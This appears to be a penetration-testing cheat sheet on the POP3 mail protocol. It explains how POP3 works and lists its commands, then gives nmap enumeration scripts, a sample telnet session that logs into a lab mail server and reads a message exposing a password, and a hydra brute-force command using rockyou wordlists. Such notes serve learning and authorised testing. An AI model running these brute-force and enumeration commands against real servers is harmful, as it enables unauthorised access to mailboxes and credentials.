POP3 is a protocol used by email clients to retrieve emails from a remote server. It is the third and most widely used version of the Post Office Protocol. Designed to be simple and efficient, POP3 allows users to download their emails from the server to their local device. Once downloaded, emails are typically removed from the server, though many modern implementations provide an option to leave messages on the server for further access.

How POP3 Works:
-

When an email client, such as Microsoft Outlook or Thunderbird, is configured to use POP3, the following steps take place:

* Client Connects to Server: The email client connects to the POP3 server (usually via port 110 for unencrypted communication or port 995 for encrypted SSL/TLS communication).

* User Authentication: The client sends login credentials (username and password) to the server to authenticate the user.

* Retrieving Emails: After authentication, the client sends commands to retrieve the emails stored on the server.

* Email Download: The server sends the requested emails to the client, which are then downloaded to the local device.

* Delete Emails: By default, POP3 removes the emails from the server after they are downloaded. However, modern email clients often have the option to leave copies on the server.

* End Session: The client sends a QUIT command, logging out from the server and closing the connection.

Common POP3 Commands:
-

* USER: Send the username to log in.
* PASS: Send the password to authenticate the user.
* STAT: Get the number of messages in the mailbox and their total size.
* LIST: List all messages and their sizes.
* RETR: Retrieve (download) a specific message.
* DELE: Delete a message from the mailbox.
* QUIT: Log out and close the connection.


Automated enumeration:
--
```
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> #All are default scripts
```
The pop3-ntlm-info plugin will return some "sensitive" data (Windows versions).
POP3 bruteforce
-
POP syntax
Example:
```
root@kali:~# telnet $ip 110
 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
 USER billydean    
 +OK
 PASS password
 +OK Welcome billydean

 list

 +OK 2 1807
 1 786
 2 1021

 retr 1

 +OK Message follows
 From: jamesbrown@motown.com
 Dear Billy Dean,

 Here is your login for remote desktop ... try not to forget it this time!
 username: billydean
 password: PA$$W0RD!Z
```
Bruteforce using hydra:
-
```
hydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt pop3://10.10.30.19 -s <port> -V
```

